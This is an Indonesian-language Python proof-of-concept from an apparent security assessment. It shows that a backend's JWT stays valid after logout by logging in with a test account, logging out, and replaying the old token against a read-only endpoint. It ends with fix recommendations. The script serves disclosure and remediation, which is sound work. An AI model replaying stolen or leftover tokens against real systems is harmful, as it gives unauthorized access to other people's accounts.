#!/usr/bin/env python3
"""
PoC: HIGH-002 — JWT Token Masih Valid Setelah Logout
====================================================
Demonstrasi bahwa token JWT tetap dapat digunakan untuk mengakses API
setelah user melakukan logout — karena tidak ada token blacklist.

TUJUAN DEMO:
  Membuktikan bahwa logout hanya menghapus token dari browser (client-side),
  tapi token yang sudah diterbitkan masih valid di server selama 24 jam.

CARA MENJALANKAN:
  1. Set BASE_URL ke endpoint DEV
  2. Set TEST_EMAIL dan TEST_PASSWORD (akun test di DEV)
  3. python HIGH-002-token-still-valid-after-logout.py

SAFETY: Read-only — hanya menggunakan endpoint GET setelah logout.
        Tidak mengubah/menghapus data apapun.
"""

import requests
import json
import time
from datetime import datetime

# ──────────────────────────────────────────────
# KONFIGURASI — sesuaikan sebelum menjalankan
# ──────────────────────────────────────────────
BASE_URL = "https://ptkpc-dev.outsystems.app/KPC_WORKBENCH"  # URL DEV
API_BASE = "http://localhost:8000/api/v1"  # Backend API langsung

# Kredensial akun TEST (bukan production!)
TEST_EMAIL = "test.user@kpc.co.id"
TEST_PASSWORD = "test_password_here"

# Endpoint yang aman untuk READ-ONLY demo
SAFE_READ_ENDPOINT = f"{API_BASE}/auth/me"  # atau endpoint list sederhana


def separator(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def step(n: int, msg: str):
    print(f"\n[STEP {n}] {msg}")


def result(label: str, value, color_code: str = ""):
    prefix = {"OK": "\033[92m✓", "FAIL": "\033[91m✗", "WARN": "\033[93m⚠"}.get(
        color_code, ""
    )
    reset = "\033[0m" if color_code else ""
    print(f"  {prefix} {label}: {value}{reset}")


def main():
    separator("HIGH-002 PoC — Token Valid After Logout")
    print(
        """
  SKENARIO:
  User login → mendapat JWT token → logout → token SEHARUSNYA tidak valid.
  
  YANG AKAN DIBUKTIKAN:
  Setelah logout, token lama MASIH bisa digunakan untuk akses API.
  
  DAMPAK BISNIS:
  Jika token dicuri sebelum user logout, attacker tetap punya akses
  selama sisa 24 jam masa berlaku token — TIDAK ADA CARA MENGHENTIKANNYA.
"""
    )

    # ──────────────────────────────────────
    # STEP 1: Login dan dapatkan token
    # ──────────────────────────────────────
    step(1, "Login — dapatkan JWT token")
    try:
        resp = requests.post(
            f"{API_BASE}/auth/token",
            data={"username": TEST_EMAIL, "password": TEST_PASSWORD},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=10,
        )
        if resp.status_code != 200:
            print(f"  Login gagal: {resp.status_code} — {resp.text[:200]}")
            print("  → Pastikan TEST_EMAIL dan TEST_PASSWORD sudah benar.")
            return

        token_data = resp.json()
        jwt_token = token_data["access_token"]
        expires_in = token_data.get("expires_in", "unknown")

        result("Status login", "BERHASIL", "OK")
        result("Token (prefix)", jwt_token[:40] + "...", "OK")
        result("Expires in", f"{expires_in} detik ({int(expires_in)//3600} jam)")
        login_time = datetime.now().isoformat()
        result("Login time", login_time)

    except requests.exceptions.ConnectionError:
        print(f"  GAGAL terhubung ke {API_BASE}")
        print("  Pastikan backend berjalan di localhost:8000")
        return

    # ──────────────────────────────────────
    # STEP 2: Verifikasi token bekerja
    # ──────────────────────────────────────
    step(2, "Verifikasi token valid SEBELUM logout")
    resp = requests.get(
        SAFE_READ_ENDPOINT,
        headers={"Authorization": f"Bearer {jwt_token}"},
        timeout=10,
    )
    if resp.status_code == 200:
        result("Akses API dengan token", "BERHASIL (HTTP 200)", "OK")
        user_data = resp.json()
        result("User email", user_data.get("email", "N/A"))
    else:
        result("Akses API", f"HTTP {resp.status_code}", "FAIL")

    # ──────────────────────────────────────
    # STEP 3: Logout
    # ──────────────────────────────────────
    step(3, "Melakukan LOGOUT")
    resp = requests.post(
        f"{API_BASE}/auth/logout",
        headers={"Authorization": f"Bearer {jwt_token}"},
        timeout=10,
    )
    if resp.status_code == 200:
        logout_data = resp.json()
        result("Logout endpoint dipanggil", "HTTP 200", "OK")
        result("Backend response", json.dumps(logout_data)[:100])
        print("\n  PERHATIKAN: Backend hanya mengembalikan logout_url Azure.")
        print("  Tidak ada token invalidation, tidak ada blacklist entry.")
    else:
        result("Logout", f"HTTP {resp.status_code}", "WARN")

    logout_time = datetime.now().isoformat()

    # ──────────────────────────────────────
    # STEP 4: Coba gunakan token SETELAH logout
    # ──────────────────────────────────────
    step(4, f"Mencoba akses API dengan token LAMA setelah logout ({logout_time})")
    print("  Simulasi: 'attacker' menggunakan token yang dicuri sebelum logout")

    time.sleep(1)  # Jeda singkat untuk dramatisasi

    resp = requests.get(
        SAFE_READ_ENDPOINT,
        headers={"Authorization": f"Bearer {jwt_token}"},
        timeout=10,
    )

    if resp.status_code == 200:
        print()
        print("  \033[91m╔══════════════════════════════════════════════════╗\033[0m")
        print("  \033[91m║  VULNERABILITY CONFIRMED: TOKEN MASIH VALID!    ║\033[0m")
        print("  \033[91m╚══════════════════════════════════════════════════╝\033[0m")
        user_data = resp.json()
        result("HTTP Status", "200 OK", "FAIL")
        result("Email yang diakses", user_data.get("email", "N/A"), "FAIL")
        result("Token masih valid sampai", f"~{int(expires_in)//3600} jam ke depan", "FAIL")
    else:
        result("HTTP Status", f"{resp.status_code} (Token sudah invalid)", "OK")
        print("  Token berhasil diinvalidasi. Finding ini sudah diperbaiki.")

    # ──────────────────────────────────────
    # STEP 5: Ringkasan untuk presentasi
    # ──────────────────────────────────────
    separator("RINGKASAN DEMO — HIGH-002")
    print(
        """
  YANG TERBUKTI:
  ✗ Setelah logout, JWT token TIDAK diinvalidasi di sisi server.
  ✗ Token yang dicuri sebelum logout tetap bisa digunakan oleh attacker.
  ✗ Tidak ada cara admin untuk menghentikan akses dengan token yang bocor.

  BUSINESS RISK:
  • Jika laptop karyawan dicuri → attacker punya akses selama 24 jam.
  • Jika ada XSS di halaman web → token dicuri & tetap valid meski user logout.
  • Admin meng-nonaktifkan user di database → user punya token lama yang masih jalan.
  • Tidak ada tombol "paksa logout dari semua device".

  REKOMENDASI:
  → Implementasi token blacklist (Redis/DB)
  → Kurangi expiry ke 15-30 menit + refresh token
  → Cek is_active dari DB setiap request (bukan hanya dari JWT payload)
"""
    )


if __name__ == "__main__":
    main()
